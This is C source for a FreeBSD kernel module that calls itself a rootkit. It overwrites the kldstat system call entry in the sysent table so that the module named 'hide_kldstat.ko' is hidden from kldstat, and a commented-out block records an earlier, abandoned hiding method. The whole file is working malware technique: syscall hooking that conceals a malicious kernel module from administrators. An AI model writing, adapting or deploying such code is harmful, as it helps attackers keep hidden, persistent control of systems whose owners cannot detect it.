#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/uio.h>
#include <sys/malloc.h>
#include <sys/errno.h>
#include <sys/syslog.h>
#include <sys/libkern.h>
#include <sys/linker.h>
#include <sys/errno.h>

#define ROOTKIT_NAME "hide_kldstat.ko"
#define DEBUG_TAG "[hook_kldstat]: "

static int kldstat_hook(struct thread *td, void *args)
{
    struct kldstat_args *k_args = NULL;
    struct kld_file_stat *kfs = NULL;
    char module_name[MAXPATHLEN] = {0};
    int error = 0;
    int done = 0;

    error = sys_kldstat(td, args);

    k_args = (struct kldstat_args *) args;

    if (k_args != NULL){
        kfs = k_args->stat;

        if (kfs != NULL){
            if (copyinstr(kfs->name, module_name, MAXPATHLEN, &done) == 0){
                log(LOG_DEBUG, "%s Modulename: %s\n", DEBUG_TAG, module_name);
                if (strncmp(module_name, ROOTKIT_NAME, strlen(ROOTKIT_NAME)) == 0){
                    log(LOG_DEBUG, "%s Found rootkit, hiding from kldstat!\n", DEBUG_TAG);
                    /*
                        Not enough to hook hide the kernel module.
                        Since the error is shown in STDOUT.
                    */

                    /*
                    bzero(module_name, MAXPATHLEN);

                    kfs->version = 0;
                    kfs->refs = 0;
                    kfs->id = 0;
                    kfs->address = 0;
                    kfs->size = 0;

                    copyout(module_name, kfs->name, MAXPATHLEN);
                    copyout(module_name, kfs->pathname, MAXPATHLEN);
                    */
                    return ENOENT;
                }
            }

            else{
                log(LOG_DEBUG, "%s Failed to copy in str.\n", DEBUG_TAG);
            }
        }
    }

    return error;
}

static int load_handler(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd){
        case MOD_LOAD:
            log(LOG_DEBUG, "Hooking kldstat(). ");
            sysent[SYS_kldstat].sy_call = (sy_call_t *) kldstat_hook;
            break;
        case MOD_UNLOAD:
            log(LOG_DEBUG, "Unhooking kldstat(). ");
            sysent[SYS_kldstat].sy_call = (sy_call_t *) sys_kldstat;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t rk_mod = {
    "hide_kldstat",      // module name
    load_handler,   // load function
    NULL
};

DECLARE_MODULE(hide_kldstat, rk_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
